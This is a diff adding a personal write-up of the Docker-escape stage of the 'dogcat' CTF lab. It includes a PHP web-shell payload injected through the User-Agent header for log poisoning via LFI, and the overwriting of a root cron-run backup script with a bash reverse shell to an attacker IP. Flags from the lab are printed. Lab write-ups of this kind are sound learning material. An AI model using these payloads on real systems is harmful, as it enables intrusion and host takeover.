@@ -408,5 +408,108 @@ THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
 
 ->
 
+Now for the docker escaping part of the CTF (we know that because of the challenge tags)
+i have searched everywhere and used any docker vulnerabilities enumeration tool in the following 
+link : https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
+
+
+
+-------------------->
+now i had to return a bit & peek into a walkthrough. 
+found 2 things :
+
+# found a more elegant way to reverse shell.
+  it involves log injection (via burp & user-agent header 
+  <?php system[$_GET['c']; ?> ) and LFI (to the /var/log/apache2/access.log file) 
+  which is alot nicer & cleaner way to reverse shell
+ 
+# next step is in the backup files found in /opt/backups
+  which i saw in linpeas & deepci enumeration tools but
+  didnt understand at the time
+
+
+--------------------------------->
+cd /opt/backups
+ls
+
+->
+
+backup.sh
+backup.tar
+
+->
+
+cat backup.sh
+->
+#!/bin/bash
+tar cf /root/container/backup/backup.tar /root/container
+
+
+tar -xf backup.tar
+-> 
+
+ls root/container
+Dockerfile
+backup
+launch.sh
+src
+
+
+cat launch.sh
+->
+#!/bin/bash
+docker run -d -p 80:80 -v /root/container/backup:/opt/backups --rm box
+ 
+
+
+cat root/container/Dockerfile
+->
+nothing we haven't saw yet
+
+
+---------->
+after reading the launch.sh & backup.sh we can connect the dots...
+
+# first of all in launch.sh :
+-v /root/container/backup:/opt/backups 
+means we create a volume link between a folder in host
+  (/root/container/backup) to a folder in docker (/opt/backups)
+
+# in backup.sh we create a tar based on folder from host
+same folder is used in file starting docker (launch.sh)
+
+tar cf /root/container/backup/backup.tar /root/container
+
+
+---------->
+-rw-r--r-- 1 root root 5888000 Feb 15 11:21 backup.tar
+-rw-r--r-- 1 root root 5888000 Feb 15 11:22 backup.tar
+
+we cab see that each minute the file backup.tar is changed
+meaning the file backup.sh is also ran each minute
+
+meaning we can change backup.sh to something else 
+(since were root in docker machine) & see if we can
+grab a file outside of dockerm, E.g, reverse shell
+
+
+echo "#!/bin/bash" > backup.sh
+echo "bash -i >& /dev/tcp/10.8.56.244/5678 0>&1" >> backup.sh
+cat backup.sh
+->
+
+
+root@dogcat:~# ls
+container
+flag4.txt
+
+root@dogcat:~# cat flag4.txt
+THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
+
+:D
+
+
+
+
 
 
